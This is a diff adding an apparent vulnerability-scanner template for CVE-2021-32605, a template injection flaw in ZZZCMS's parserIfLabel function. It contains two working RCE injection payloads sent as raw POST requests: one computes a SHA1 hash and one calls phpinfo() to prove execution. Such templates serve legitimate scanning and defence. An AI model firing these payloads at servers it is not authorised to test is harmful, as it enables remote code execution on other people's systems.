@@ -1,0 +1,45 @@
+id: zzzcms-template-injection-cve-2021-32605
+info:
+  name: ZZZCMS parserIfLabel Template Injection RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    ZZZCMS versions up to 1.5.9 are vulnerable to a template injection vulnerability in the parserIfLabel function. This can allow remote attackers to execute arbitrary code on the server.
+  tags: command-execution,rce
+  classification:
+    cve-id: CVE-2021-32605
+  reference:
+    - http://www.zzzcms.com/down/?list_5_1.html
+
+variables:
+  rand_value: '{{rand_int(600000, 666667)}}'
+  expected_hash: '{{sha1(rand_value)}}'
+
+http:
+  - raw:
+      - |
+        POST /?location=search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        keys=%7Bif:=die(sha1({{rand_value}}))%7Dacc%7Bend%20if%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{expected_hash}}"
+        part: body
+
+  - raw:
+      - |
+        POST /?location=search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        keys=%7Bif:=die(PhPinfo())%7Dacc%7Bend%20if%7D
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+        part: body
